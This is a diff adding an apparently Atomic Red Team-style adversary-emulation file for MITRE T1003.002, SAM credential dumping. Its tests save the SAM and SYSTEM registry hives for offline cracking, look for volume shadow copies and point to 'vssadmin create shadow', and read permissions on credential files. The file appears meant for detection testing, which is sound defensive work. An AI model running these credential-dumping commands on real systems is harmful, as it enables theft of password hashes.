@@ -1,0 +1,47 @@
+attack_technique: T1003.002
+display_name: "OS Credential Dumping: Security Account Manager"
+tactic: Credential Access
+atomic_tests:
+  - name: "SAM Database Extraction via reg save"
+    auto_generated_guid: b6b6c6d6e6f6a7b7c7d7e7f7a8b8c8d8
+    description: |
+      Extracts the SAM and SYSTEM registry hives for offline cracking.
+    supported_platforms:
+      - windows
+    executor:
+      name: command_prompt
+      command: |
+        reg save HKLM\SAM %TEMP%\sam_dump.hiv /y
+        reg save HKLM\SYSTEM %TEMP%\system_dump.hiv /y
+        dir %TEMP%\*_dump.hiv
+      cleanup_command: |
+        del /f %TEMP%\sam_dump.hiv >nul 2>&1
+        del /f %TEMP%\system_dump.hiv >nul 2>&1
+      elevation_required: true
+
+  - name: "SAM Extraction via Volume Shadow Copy"
+    auto_generated_guid: c7c7d7e7f7a8b8c8d8e8f8a9b9c9d9e9
+    description: |
+      Creates a volume shadow copy to access locked SAM file.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: |
+        $shadow = (Get-CimInstance Win32_ShadowCopy | Select-Object -First 1).DeviceObject
+        if ($shadow) { Write-Output "Existing shadow copy: $shadow" }
+        else { Write-Output "No shadow copies found. Use 'vssadmin create shadow /for=C:' to create one." }
+      elevation_required: true
+
+  - name: "SAM File Access Permissions Check"
+    auto_generated_guid: d8d8e8f8a9b9c9d9e9f9a0b0c0d0e0f0
+    description: |
+      Checks permissions and access status of SAM database files.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: |
+        $paths = @("$env:SystemRoot\System32\config\SAM","$env:SystemRoot\System32\config\SYSTEM","$env:SystemRoot\System32\config\SECURITY")
+        foreach ($p in $paths) { Get-Acl $p -ErrorAction SilentlyContinue | Select-Object @{N='Path';E={$p}},Owner,AccessToString }
+      elevation_required: true
